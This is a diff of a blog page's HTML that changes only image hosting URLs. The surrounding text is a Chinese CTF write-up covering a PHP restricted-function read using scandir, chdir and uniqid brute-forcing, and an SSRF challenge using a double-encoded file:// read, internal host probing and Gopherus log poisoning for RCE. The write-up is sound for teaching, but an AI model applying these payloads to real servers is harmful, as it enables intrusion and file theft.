@@ -112,7 +112,7 @@
 		<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>​        把010编辑器放进010编辑器直接搜索就是了</p>
 <h2 id="decade"><a href="#decade" class="headerlink" title="decade"></a>decade</h2><ul>
 <li><p>页面源码提示代码在<code>/code</code>并且flag在这个页面</p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191102/15727051288542.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727051288542.png" alt="img"></p>
 </li>
 <li><p>代码和字节跳动的一道boring-code相似,但是过滤得更多</p>
 <pre><code class="php"> &lt;?php
@@ -143,18 +143,18 @@ error_reporting(0);
 for($i=0;$i&lt;1000;$i++)
 echo(chr(strrev(uniqid())));
 ?&gt;</code></pre>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191102/15727060052967.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727060052967.png" alt="img"></p>
 </li>
 <li><p>非常明显已经可以构造在不断刷新这个网页在某一时刻就能构造出来点<code>（.）</code>进而读取到目录，而这里正则只允许26个字母构成的函数，所以var_dump这种是不可能使用了，所以这里使用<code>echo、implode</code>将返回的数组变成字符串来读取。那么构造payload如下，使用burpsuite去爆破。</p>
 <pre><code class="php">echo(implode(scandir(chr(strrev(uniqid())))));</code></pre>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191102/15727064105621.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727064105621.png" alt="img"></p>
 </li>
 <li><p>可以看到已经读取了当前目录下的文件列表吗，那么下面就是要读取上层目录下的index.php文件。首先读取一下上层目录的列表，我们从上读取当前目录可以知道返回的文件目录数组如下关系：</p>
 <pre><code class="php\">[0=&gt;&#39;.&#39;,1=&gt;&#39;..&#39;,3=&gt;&#39;index.php&#39;]</code></pre>
 </li>
 <li><p>那么我们要读取上层目录就需要构造<code>scandir(&#39;..&#39;)</code>,那么很明显我们获取第二个元素即可得到两点，构造payload如下：</p>
 <pre><code class="php">  echo(implode(scandir(next(scandir(chr(strrev(uniqid())))))));</code></pre>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191102/15727066455027.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191102/15727066455027.png" alt="img"></p>
 </li>
 <li><p>从这里我们可以得知index.php在最后一个元素，那么我们可以使用end()直接获取到，但是要读取到这个文件我们首先需要先跳转到这个目录，那么可以这样构造,使用chdir向上跳转一个目录：</p>
 <pre><code class="php">chdir(next(scandir(chr(strrev(uniqid())))))</code></pre>
@@ -166,7 +166,7 @@ echo(chr(strrev(uniqid())));
 <pre><code class="php">echo(implode(file(end(scandir(chr(strrev(uniqid(chdir(next(scandir(chr(strrev(uniqid())))))))))))));</code></pre>
 </li>
 <li><p>但是这里存在一个问题，那就是两次去的值不一定都是点，那么就需要进行N次爆破，在某一时刻这两个值都取到点的时候那么就会读取成功。                                                                                                                                                                                                                                 </p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191103/15727713396593.jpg" alt="img">                                                                                                                                                                                                                                                                       </p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727713396593.jpg" alt="img">                                                                                                                                                                                                                                                                       </p>
 </li>
 </ul>
 <h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><ul>
@@ -183,22 +183,22 @@ curl_setopt($ch,CURLOPT_URL,&quot;$x&quot;);
 curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
 $result = curl_exec($ch);
 echo $result; </code></pre>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191103/1572771550497.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/1572771550497.png" alt="img"></p>
 </li>
 <li><p>这里直接读flag.php,直接使用双url编码绕过</p>
 <pre><code class="php">index.php?x=file:///var/www/html/flag.p%2568p</code></pre>
 </li>
 </ul>
-<p>  <img src="https://www.mycute.cn/static/umeditor/php/upload/20191103/15727716421531.png" alt="img"></p>
+<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727716421531.png" alt="img"></p>
 <ul>
 <li><p>提示/etc/hosts</p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191103/15727719047413.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727719047413.png" alt="img"></p>
 </li>
 <li><p>发现内网地址，直接爆破内网，发现172.18.0.2返回提示有文件包含漏洞</p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191103/15727719455947.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727719455947.png" alt="img"></p>
 </li>
 <li><p>扫描这个主机开放的端口</p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191103/15727720229388.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191103/15727720229388.png" alt="img"></p>
 </li>
 <li><p>发现25端口开放，这里可以联想到结合文件包含，使用 <code>gopherus</code> 污染日志文件从而达到RCE。使用 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Ftarunkant%2FGopherus" target="_blank" rel="noopener"> gopherus </a>生成利用脚本。污染成功后使用文件包含即可rce，日志文件路径：</p>
 <pre><code class="php">/var/log/maillog
@@ -207,8 +207,8 @@ echo $result; </code></pre>
 /var/adm/syslog/mail.log</code></pre>
 </li>
 </ul>
-<p>  <img src="https://www.mycute.cn/static/umeditor/php/upload/20191103/15727724065385.png" alt="img"></p>
-<p>  <img src="https://www.mycute.cn/static/umeditor/php/upload/20191103/15727724916990.png" alt="img"></p>
+<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727724065385.png" alt="img"></p>
+<p>  <img src="http://goodcheerleung.gitee.io/mycute/20191103/15727724916990.png" alt="img"></p>
 
 	</div>
 	<div class="meta split">
